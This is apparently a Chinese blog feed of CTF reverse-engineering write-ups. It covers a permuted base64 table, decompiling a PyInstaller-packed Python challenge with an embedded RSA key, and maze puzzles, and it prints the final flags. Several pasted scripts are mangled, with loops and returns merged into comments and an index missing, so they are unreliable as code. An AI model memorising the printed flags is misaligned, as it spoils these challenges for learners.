class="number">23</span>;</span><br><span class="line"> v3[<span class="number">53</span>] = <span class="number">36</span>;</span><br><span class="line"> v3[<span class="number">54</span>] = <span class="number">1</span>;</span><br><span class="line"> v3[<span class="number">55</span>] = <span class="number">22</span>;</span><br><span class="line"> v3[<span class="number">56</span>] = <span class="number">57</span>;</span><br><span class="line"> v3[<span class="number">57</span>] = <span class="number">63</span>;</span><br><span class="line"> v3[<span class="number">58</span>] = <span class="number">8</span>;</span><br><span class="line"> v3[<span class="number">59</span>] = <span class="number">27</span>;</span><br><span class="line"> v3[<span class="number">60</span>] = <span class="number">6</span>;</span><br><span class="line"> v3[<span class="number">61</span>] = <span class="number">62</span>;</span><br><span class="line"> v3[<span class="number">62</span>] = <span class="number">45</span>;</span><br><span class="line"> v3[<span class="number">63</span>] = <span class="number">29</span>;</span><br></pre></td></tr></table></figure><p>我们先上一个脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">basechange</span>(<span class="params">base</span>):<span class="comment"># 定义一个索引数组，用于置换字符的位置</span></span><br><span class="line">  index = [<span class="number">0</span>] * <span class="number">65</span></span><br><span class="line">  index[<span class="number">0</span>] = <span class="number">16</span></span><br><span class="line">  index[<span class="number">1</span>] = <span class="number">34</span></span><br><span class="line">  index[<span class="number">2</span>] = <span class="number">56</span></span><br><span class="line">  index[<span class="number">3</span>] = <span class="number">7</span></span><br><span class="line">  index[<span class="number">4</span>] = <span class="number">46</span></span><br><span class="line">  index[<span class="number">5</span>] = <span class="number">2</span></span><br><span class="line">  index[<span class="number">6</span>] = <span class="number">10</span></span><br><span class="line">  index[<span class="number">7</span>] = <span class="number">44</span></span><br><span class="line">  index[<span class="number">8</span>] = <span class="number">20</span></span><br><span class="line">  index[<span class="number">9</span>] = <span class="number">41</span></span><br><span class="line">  index[<span class="number">10</span>] = <span class="number">59</span></span><br><span class="line">  index[<span class="number">11</span>] = <span class="number">31</span></span><br><span class="line">  index[<span class="number">12</span>] = <span class="number">51</span></span><br><span class="line">  index[<span class="number">13</span>] = <span class="number">60</span></span><br><span class="line">  index[<span class="number">14</span>] = <span class="number">61</span></span><br><span class="line">  index[<span class="number">15</span>] = <span class="number">26</span></span><br><span class="line">  index[<span class="number">16</span>] = <span class="number">5</span></span><br><span class="line">  index[<span class="number">17</span>] = <span class="number">40</span></span><br><span class="line">  index[<span class="number">18</span>] = <span class="number">21</span></span><br><span class="line">  index[<span class="number">19</span>] = <span class="number">38</span></span><br><span class="line">  index[<span class="number">20</span>] = <span class="number">4</span></span><br><span class="line">  index[<span class="number">21</span>] = <span class="number">54</span></span><br><span class="line">  index[<span class="number">22</span>] = <span class="number">52</span></span><br><span class="line">  index[<span class="number">23</span>] = <span class="number">47</span></span><br><span class="line">  index[<span class="number">24</span>] = <span class="number">3</span></span><br><span class="line">  index[<span class="number">25</span>] = <span class="number">11</span></span><br><span class="line">  index[<span class="number">26</span>] = <span class="number">58</span></span><br><span class="line">  index[<span class="number">27</span>] = <span class="number">48</span></span><br><span class="line">  index[<span class="number">28</span>] = <span class="number">32</span></span><br><span class="line">  index[<span class="number">29</span>] = <span class="number">15</span></span><br><span class="line">  index[<span class="number">30</span>] = <span class="number">49</span></span><br><span class="line">  index[<span class="number">31</span>] = <span class="number">14</span></span><br><span class="line">  index[<span class="number">32</span>] = <span class="number">37</span></span><br><span class="line"></span><br><span class="line">  index[<span class="number">34</span>] = <span class="number">55</span></span><br><span class="line">  index[<span class="number">35</span>] = <span class="number">53</span></span><br><span class="line">  index[<span class="number">36</span>] = <span class="number">24</span></span><br><span class="line">  index[<span class="number">37</span>] = <span class="number">35</span></span><br><span class="line">  index[<span class="number">38</span>] = <span class="number">18</span></span><br><span class="line">  index[<span class="number">39</span>] = <span class="number">25</span></span><br><span class="line">  index[<span class="number">40</span>] = <span class="number">33</span></span><br><span class="line">  index[<span class="number">41</span>] = <span class="number">43</span></span><br><span class="line">  index[<span class="number">42</span>] = <span class="number">50</span></span><br><span class="line">  index[<span class="number">43</span>] = <span class="number">39</span></span><br><span class="line">  index[<span class="number">44</span>] = <span class="number">12</span></span><br><span class="line">  index[<span class="number">45</span>] = <span class="number">19</span></span><br><span class="line">  index[<span class="number">46</span>] = <span class="number">13</span></span><br><span class="line">  index[<span class="number">47</span>] = <span class="number">42</span></span><br><span class="line">  index[<span class="number">48</span>] = <span class="number">9</span></span><br><span class="line">  index[<span class="number">49</span>] = <span class="number">17</span></span><br><span class="line">  index[<span class="number">50</span>] = <span class="number">28</span></span><br><span class="line">  index[<span class="number">51</span>] = <span class="number">30</span></span><br><span class="line">  index[<span class="number">52</span>] = <span class="number">23</span></span><br><span class="line">  index[<span class="number">53</span>] = <span class="number">36</span></span><br><span class="line">  index[<span class="number">54</span>] = <span class="number">1</span></span><br><span class="line">  index[<span class="number">55</span>] = <span class="number">22</span></span><br><span class="line">  index[<span class="number">56</span>] = <span class="number">57</span></span><br><span class="line">  index[<span class="number">57</span>] = <span class="number">63</span></span><br><span class="line">  index[<span class="number">58</span>] = <span class="number">8</span></span><br><span class="line">  index[<span class="number">59</span>] = <span class="number">27</span></span><br><span class="line">  index[<span class="number">60</span>] = <span class="number">6</span></span><br><span class="line">  index[<span class="number">61</span>] = <span class="number">62</span></span><br><span class="line">  index[<span class="number">62</span>] = <span class="number">45</span></span><br><span class="line">  index[<span class="number">63</span>] = <span class="number">29</span><span class="comment"># 将字符串转换为列表，方便修改</span></span><br><span class="line">  base = <span class="built_in">list</span>(base)</span><br><span class="line">  <span class="comment"># 进行48次置换for i in range(48):</span></span><br><span class="line">    <span class="comment"># 创建一个临时列表，用于存储置换后的字符</span></span><br><span class="line">    temp = [<span class="number">0</span>] * <span class="number">64</span><span class="comment"># 遍历索引数组，按照索引交换字符for j in range(64):</span></span><br><span class="line">      temp[j] = base[index[j]]</span><br><span class="line">    <span class="comment"># 将临时列表赋值给原始列表</span></span><br><span class="line">    base = temp</span><br><span class="line">  <span class="comment"># 将列表转换回字符串，并返回return &quot;&quot;.join(base)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个字符串，用于测试</span></span><br><span class="line">table = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span><span class="comment"># 调用函数，对字符串进行置换</span></span><br><span class="line">table = basechange(table)</span><br><span class="line"><span class="comment"># 打印置换后的字符串print(table)</span></span><br></pre></td></tr></table></figure><p>运行后得到</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gJ1BRjQie/FIWhEslq7GxbnL26M4+HXUtcpmVTKaydOP38of5v90ZSwrkYzCAuND</span><br></pre></td></tr></table></figure><p>再继续替换标准base64编码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">code = <span class="string">&quot;gJ1BRjQie/FIWhEslq7GxbnL26M4+HXUtcpmVTKaydOP38of5v90ZSwrkYzCAuND&quot;</span></span><br><span class="line">flag = <span class="string">&quot;GQTZlSqQXZ/ghxxwhju3hbuZ4wufWjujWrhYe7Rce7ju&quot;</span></span><br><span class="line">coder = <span class="built_in">str</span>.maketrans(code, <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789==&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(flag.translate(coder))</span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(flag.translate(coder)))</span><br></pre></td></tr></table></figure><p><img src="/../images/week5-re-%E4%BE%8B%E9%A2%98.assets/1746891657813-20.png" alt="img"></p><p>运行后获得flag</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LitCTF&#123;B@<span class="number">5E64</span>_l5_tooo0_E3sy!!!!!&#125;</span><br></pre></td></tr></table></figure><p>不过我看有的wp直接利用动调获得了flag，还没试</p><h1 id="NISACTF-2022-ezpython"><a href="#NISACTF-2022-ezpython" class="headerlink" title="[NISACTF 2022]ezpython"></a>[NISACTF 2022]ezpython</h1><p><img src="/../images/week5-re-%E4%BE%8B%E9%A2%98.assets/1746891657813-21.png" alt="img"></p><p>我们发现这道题是有打包工具的</p><p>这道题涉及到了python反编译，那就先说一下反编译的步骤</p><p>下载工具pyinstxtractor.py,并将这道题和工具放在同一个目录下，如下：</p><p><img src="/../images/week5-re-%E4%BE%8B%E9%A2%98.assets/1746891657813-22.png" alt="img"></p><p>在当前目录打开终端</p><p>并执行<code>python pyinstxtractor.py ez_python.exe</code></p><p><img src="/../images/week5-re-%E4%BE%8B%E9%A2%98.assets/1746891657813-23.png" alt="img"></p><p>我们发现在这个文件夹下多出了一个文件夹</p><p><img src="/../images/week5-re-%E4%BE%8B%E9%A2%98.assets/1746891657813-24.png" alt="img"></p><p>打开看到里面src.pyc和struct.pyc两个文件</p><p>我们用010打开struct.pyc,复制前十一字节成为src.pyc的前十一个字节</p><p><img src="/../images/week5-re-%E4%BE%8B%E9%A2%98.assets/1746891657813-25.png" alt="img"></p><p><a href="https://tool.lu/pyc/">https://tool.lu/pyc/</a></p><p>可以用这个网站进行python反编译（珍惜机会，半小时就一次）</p><p>成功后得到以下代码，源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">key1 = rsa.PrivateKey.load_pkcs1(base64.b64decode(<span class="string">&#x27;LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcVFJQkFBS0NBUUVBcVJUZ0xQU3BuT0ZDQnJvNHR1K1FBWXFhTjI2Uk42TzY1bjBjUURGRy9vQ1NJSU00ClNBeEVWaytiZHpSN2FucVNtZ1l5MEhRWGhDZTM2U2VGZTF0ejlrd0taL3UzRUpvYzVBSzR1NXZ4UW5QOWY1cTYKYVFsbVAvVjJJTXB5NFFRNlBjbUVoNEtkNm81ZWRJUlB2SHd6V0dWS09OQ3BpL0taQ082V0tWYkpXcWh3WGpEQgpsSDFNVURzZ1gyVUM4b3Bodnk5dXIyek9kTlBocElJZHdIc1o5b0ZaWWtaMUx5Q0lRRXRZRmlKam1GUzJFQ1RVCkNvcU9acnQxaU5jNXVhZnFvZlB4eHlPb2wwYVVoVGhiaHE4cEpXL3FPSFdYd0xJbXdtNk96YXFVeks4NEYyY3UKYWRiRE5zeVNvaElHaHYzd0lBVThNSlFnOEthd1Z3ZHBzRWhlSXdJREFRQUJBb0lCQURBazdwUStjbEZtWHF1Vgp1UEoyRWxZdUJpMkVnVHNMbHZ0c1ltL3cyQnM5dHQ0bEh4QjgxYlNSNUYyMEJ2UlJ4STZ3OXlVZCtWZzdDd1lMCnA5bHhOL3JJdWluVHBkUEhYalNhaGNsOTVOdWNOWEZ4T0dVU05SZy9KNHk4dUt0VHpkV3NITjJORnJRa0o4Y2IKcWF5czNOM3RzWTJ0OUtrUndjbUJGUHNJalNNQzB5UkpQVEE4cmNqOFkranV3SHZjbUJPNHVFWXZXeXh0VHR2UQova0RQelBqdTBuakhkR055RytkSDdkeHVEV2Jxb3VZQnRMdzllZGxXdmIydTJ5YnZzTXl0NWZTOWF1a01NUjNoCnBhaDRMcU1LbC9ETTU3cE44Vms0ZTU3WE1zZUJLWm1hcEptcVNnSGdjajRPNWE2R1RvelN1TEVoTmVGY0l2Tm8KWFczTEFHRUNnWWtBc0J0WDNVcFQ3aUcveE5BZDdSWER2MENOY1k1QnNZOGY4NHQ3dGx0U2pjSWdBKy9nUjFMZQpzb2gxY1RRd1RadUYyRTJXL1hHU3orQmJDTVVySHNGWmh1bXV6aTBkbElNV3ZhU0dvSlV1OGpNODBlUjRiVTRyCmdYQnlLZVZqelkzNVlLejQ5TEVBcFRQcTZRYTVQbzhRYkF6czhuVjZtNXhOQkNPc0pQQ29zMGtCclFQaGo5M0cKOFFKNUFQWEpva0UrMmY3NXZlazZNMDdsaGlEUXR6LzRPYWRaZ1MvUVF0eWRLUmg2V3VEeGp3MytXeXc5ZjNUcAp5OXc0RmtLRzhqNVRpd1RzRmdzem94TGo5TmpSUWpqb3cyVFJGLzk3b2NxMGNwY1orMUtsZTI1cEJ3bk9yRDJBCkVpMUVkMGVEV3dJR2gzaFhGRmlRSzhTOG5remZkNGFMa1ZxK1V3S0JpRXRMSllIamFZY0N2dTd5M0JpbG1ZK0gKbGZIYkZKTkowaXRhazRZZi9XZkdlOUd6R1h6bEhYblBoZ2JrZlZKeEVBU3ZCOE5NYjZ5WkM5THdHY09JZnpLRApiczJQMUhuT29rWnF0WFNxMCt1UnBJdEkxNFJFUzYySDJnZTNuN2dlMzJSS0VCYnVKb3g3YWhBL1k2d3ZscUhiCjFPTEUvNnJRWk0xRVF6RjRBMmpENmdlREJVbHhWTUVDZVFDQjcyUmRoYktNL3M0TSsvMmYyZXI4Y2hwT01SV1oKaU5Hb3l6cHRrby9sSnRuZ1RSTkpYSXdxYVNCMldCcXpndHNSdEhGZnpaNlNyWlJCdTd5Y0FmS3dwSCtUd2tsNQpoS2hoSWFTNG1vaHhwUVNkL21td1JzbTN2NUNDdXEvaFNtNmNXYTdFOVZxc25heGQzV21tQ2VqTnp0MUxQWUZNCkxZMENnWWdKUHhpVTVraGs5cHB6TVAwdWU0clA0Z2YvTENldEdmQjlXMkIyQU03eW9VM2VsMWlCSEJqOEZ3UFQKQUhKUWtCeTNYZEh3SUpGTUV1RUZSSFFzcUFkSTlYVDBzL2V0QTg1Y3grQjhjUmt3bnFHakFseW1PdmJNOVNrMgptMnRwRi8rYm56ZVhNdFA3c0ZoR3NHOXJ5SEZ6UFNLY3NDSDhXWWx0Y1pTSlNDZHRTK21qblAwelArSjMKLS0tLS1FTkQgUlNBIFBSSVZBVEUgS0VZLS0tLS0K&#x27;</span>))</span><br><span class="line">key2 = rsa.PublicKey.load_pkcs1(base64.b64decode(<span class="string">&#x27;LS0tLS1CRUdJTiBSU0EgUFVCTElDIEtFWS0tLS0tCk1JSUJDZ0tDQVFFQXFSVGdMUFNwbk9GQ0JybzR0dStRQVlxYU4yNlJONk82NW4wY1FERkcvb0NTSUlNNFNBeEUKVmsrYmR6UjdhbnFTbWdZeTBIUVhoQ2UzNlNlRmUxdHo5a3dLWi91M0VKb2M1QUs0dTV2eFFuUDlmNXE2YVFsbQpQL1YySU1weTRRUTZQY21FaDRLZDZvNWVkSVJQdkh3eldHVktPTkNwaS9LWkNPNldLVmJKV3Fod1hqREJsSDFNClVEc2dYMlVDOG9waHZ5OXVyMnpPZE5QaHBJSWR3SHNaOW9GWllrWjFMeUNJUUV0WUZpSmptRlMyRUNUVUNvcU8KWnJ0MWlOYzV1YWZxb2ZQeHh5T29sMGFVaFRoYmhxOHBKVy9xT0hXWHdMSW13bTZPemFxVXpLODRGMmN1YWRiRApOc3lTb2hJR2h2M3dJQVU4TUpRZzhLYXdWd2Rwc0VoZUl3SURBUUFCCi0tLS0tRU5EIFJTQSBQVUJMSUMgS0VZLS0tLS0K&#x27;</span>))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt1</span>(<span class="params">message</span>):</span><br><span class="line">    crypto_text = rsa.encrypt(message.encode(), key2)</span><br><span class="line">    <span class="keyword">return</span> crypto_text</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt1</span>(<span class="params">message</span>):</span><br><span class="line">    message_str = rsa.decrypt(message, key1).decode()</span><br><span class="line">    <span class="keyword">return</span> message_str</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt2</span>(<span class="params">tips, key</span>):</span><br><span class="line">    ltips = <span class="built_in">len</span>(tips)</span><br><span class="line">    lkey = <span class="built_in">len</span>(key)</span><br><span class="line">    secret = []</span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> tips:</span><br><span class="line">        <span class="keyword">if</span> num &gt;= lkey:</span><br><span class="line">            num = num % lkey</span><br><span class="line">        secret.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(each) ^ <span class="built_in">ord</span>(key[num])))</span><br><span class="line">        num += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(<span class="string">&#x27;&#x27;</span>.join(secret).encode()).decode()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt2</span>(<span class="params">secret, key</span>):</span><br><span class="line">    tips = base64.b64decode(secret.encode()).decode()</span><br><span class="line">    ltips = <span class="built_in">len</span>(tips)</span><br><span class="line">    lkey = <span class="built_in">len</span>(key)</span><br><span class="line">    secret = []</span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> tips:</span><br><span class="line">        <span class="keyword">if</span> num &gt;= lkey:</span><br><span class="line">            num = num % lkey</span><br><span class="line">        secret.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(each) ^ <span class="built_in">ord</span>(key[num])))</span><br><span class="line">        num += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(secret)</span><br><span class="line"> </span><br><span class="line">flag = <span class="string">&#x27;IAMrG1EOPkM5NRI1cChQDxEcGDZMURptPzgHJHUiN0ASDgUYUB4LGQMUGAtLCQcJJywcFmddNno/PBtQbiMWNxsGLiFuLwpiFlkyP084Ng0lKj8GUBMXcwEXPTJrRDMdNwMiHVkCBFklHgIAWQwgCz8YQhp6E1xUHgUELxMtSh0xXzxBEisbUyYGOx1DBBZWPg1CXFkvJEcxO0ADeBwzChIOQkdwXQRpQCJHCQsaFE4CIjMDcwswTBw4BS9mLVMLLDs8HVgeQkscGBEBFSpQFQQgPTVRAUpvHyAiV1oPE0kyADpDbF8AbyErBjNkPh9PHiY7O1ZaGBADMB0PEVwdCxI+MCcXARZiPhwfH1IfKitGOF42FV8FTxwqPzBPAVUUOAEKAHEEP2QZGjQVV1oIS0QBJgBDLx1jEAsWKGk5Nw03MVgmWSE4Qy5LEghoHDY+OQ9dXE44Th0=&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;this is key&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    result = <span class="built_in">input</span>(<span class="string">&#x27;please input key: &#x27;</span>)this <span class="keyword">is</span> true key</span><br><span class="line">    <span class="keyword">if</span> result == decrypt2(<span class="string">&#x27;AAAAAAAAAAAfFwwRSAIWWQ==&#x27;</span>, key):</span><br><span class="line">        <span class="built_in">print</span>(decrypt1(base64.b64decode(decrypt2(flag, result))))</span><br><span class="line">    <span class="keyword">elif</span> result == key:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;flag&#123;0e26d898-b454-43de-9c87-eb3d122186bc&#125;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;key is error.&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception:</span><br><span class="line">    e = <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        e = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">del</span> e</span><br><span class="line"><span class="built_in">print</span>(decrypt2(<span class="string">&#x27;AAAAAAAAAAAfFwwRSAIWWQ==&#x27;</span>, key))  <span class="comment">#补充的</span></span><br></pre></td></tr></table></figure><p>我们需要得到正确的key</p><p><img src="/../images/week5-re-%E4%BE%8B%E9%A2%98.assets/1746891657813-26.png" alt="img"></p><p>我们看到正确的key&#x3D;this is true key</p><p>再次运行，得到flag</p><p><img src="/../images/week5-re-%E4%BE%8B%E9%A2%98.assets/1746891657813-27.png" alt="img"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;<span class="number">5236</span>cb7d-f4a7<span class="number">-4080</span><span class="number">-9b</span>de<span class="number">-8b</span>9e061609ad&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>week4-re-迷宫</title>
      <link href="/2025/05/07/week4-re-%E8%BF%B7%E5%AE%AB/"/>
      <url>/2025/05/07/week4-re-%E8%BF%B7%E5%AE%AB/</url>
      
        <content type="html"><![CDATA[<h1 id="迷宫"><a href="#迷宫" class="headerlink" title="迷宫"></a>迷宫</h1><h1 id="SWPUCTF-2021-新生赛-老鼠走迷宫"><a href="#SWPUCTF-2021-新生赛-老鼠走迷宫" class="headerlink" title="[SWPUCTF 2021 新生赛]老鼠走迷宫"></a>[SWPUCTF 2021 新生赛]老鼠走迷宫</h1><p>我们先用die查壳</p><p><img src="/../images/week4-re-%E8%BF%B7%E5%AE%AB.assets/1746614847356-17.png" alt="img"></p><p>发现有一个打包工具Pylnstaller，我们可以利用pyinstxtractor.py来解决，我们先看看这个附件的文件类型，拖进010后，文件头是4D 5A 90 00，通常是可执行文件exe.</p><p>我们需要把它放在和pyinstxtractor.py一个目录下，方便操作</p><p><img src="/../images/week4-re-%E8%BF%B7%E5%AE%AB.assets/1746614847354-1.png" alt="img"></p><p>运行后发现多了一个文件夹</p><p><img src="/../images/week4-re-%E8%BF%B7%E5%AE%AB.assets/1746614847355-2.png" alt="img"></p><p>打开后，看到5.pyc和struct.pyc,将struct.pyc中的前十六位改成5.pyc中的前十六位，保存后，进行python反编译</p><p><img src="/../images/week4-re-%E8%BF%B7%E5%AE%AB.assets/1746614847355-3.png" alt="img"></p><p><img src="/../images/week4-re-%E8%BF%B7%E5%AE%AB.assets/1746614847355-4.png" alt="img"></p><p>看到这样的</p><p><img src="/../images/week4-re-%E8%BF%B7%E5%AE%AB.assets/1746614847355-5.png" alt="img"></p><p>根据提示，flag是最短路径的md5值</p><p>暂时无法在飞书文档外展示此内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sssssddssddssaaaassssddwwddddssssssaawwaassssddssaassddddwwddssddwwwwwwwwaawwddwwwwaaaawwddwwwwddssssddwwwwddddwwddddssaassaassddddssddssaassssssddsssssss</span><br></pre></td></tr></table></figure><p><img src="/../images/week4-re-%E8%BF%B7%E5%AE%AB.assets/1746614847355-6.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">69193150b15c87d39252d974bc323217</span><br></pre></td></tr></table></figure><p>这样就解决了<code>NSSCTF&#123;69193150b15c87d39252d974bc323217&#125;</code></p><h1 id="2019华南师大CTF新生赛maze"><a href="#2019华南师大CTF新生赛maze" class="headerlink" title="2019华南师大CTF新生赛maze"></a>2019华南师大CTF新生赛maze</h1><p>题目地址：<a href="https://github.com/scnu-sloth/hsctf-2019-freshmen">https://github.com/scnu-sloth/hsctf-2019-freshmen</a></p><p>打开后先查壳，无加壳，我们再看一下c语言代码</p><p>暂时无法在飞书文档外展示此内容</p><p>我们进入ida，查看一下关键字</p><p><img src="/../images/week4-re-%E8%BF%B7%E5%AE%AB.assets/1746614847355-7.png" alt="img"></p><p>跟进，看一下函数</p><p><img src="/../images/week4-re-%E8%BF%B7%E5%AE%AB.assets/1746614847355-8.png" alt="img"></p><p><img src="/../images/week4-re-%E8%BF%B7%E5%AE%AB.assets/1746614847355-9.png" alt="img"></p><p>已知</p><ul><li>42 对应字符 <code>*</code>（星号）</li><li>35 对应字符 <code>#</code>（井号）</li></ul><p>所以这个迷宫以*为墙，#为终点，@为起点，flag是迷宫的路径</p><p>在主函数中</p><p><img src="/../images/week4-re-%E8%BF%B7%E5%AE%AB.assets/1746614847355-10.png" alt="img"></p><p>我们看到flag的长度 为24</p><p>我们现在已知迷宫的组成，可以利用脚本描绘出迷宫的样子</p><p>暂时无法在飞书文档外展示此内容</p><p><img src="/../images/week4-re-%E8%BF%B7%E5%AE%AB.assets/1746614847355-11.png" alt="img"></p><p>我们也可以利用脚本得到路径</p><p>我们也可以把路径复制进入notepad中，是169个字符很显然，这是一个13*13的迷宫图</p><p>同样可以绘制出迷宫的样子，如上</p><p>根据路径，找到Flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;sssssdsssddsdddwwdwwaaaw&#125;</span><br></pre></td></tr></table></figure><h1 id="2020华南师大CTF新生赛maze"><a href="#2020华南师大CTF新生赛maze" class="headerlink" title="2020华南师大CTF新生赛maze"></a>2020华南师大CTF新生赛maze</h1><p>依旧是先查壳</p><p>在ida中查看</p><p>先看一下主函数</p><p><img src="/../images/week4-re-%E8%BF%B7%E5%AE%AB.assets/1746614847355-12.png" alt="img"></p><p>这里的59是限制长度，flag的最短路径</p><p>再看一下里面的createmap函数</p><p><img src="/../images/week4-re-%E8%BF%B7%E5%AE%AB.assets/1746614847356-13.png" alt="img"></p><p>在这个函数中，把num中的数最终转为二进制存储在map数组中，同时原本的16个字也变为了16*16&#x3D;256个字</p><p>所以这道题的迷宫是16*16的矩阵，现在，我们需要知道参与循环的v2的值，这里 运用动态调试</p><p><img src="/../images/week4-re-%E8%BF%B7%E5%AE%AB.assets/1746614847356-14.png" alt="img"></p><p>运行十六次，最后在local页面获得十六进制字符串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">num = [0xFFFF, 0x83F7, 0xBBF7, 0xBB17, 0xBB57, 0xB857, 0xBF57, 0xBF17, 0xBFB7, 0xBFB7, 0x8611, 0xF7B5, 0xF7B5, 0x7B4, 0xFF87, 0xFFFF]</span><br></pre></td></tr></table></figure><p>再结合check函数中，迷宫的正确走法，得到正确的地图</p><p><img src="/../images/week4-re-%E8%BF%B7%E5%AE%AB.assets/1746614847356-15.png" 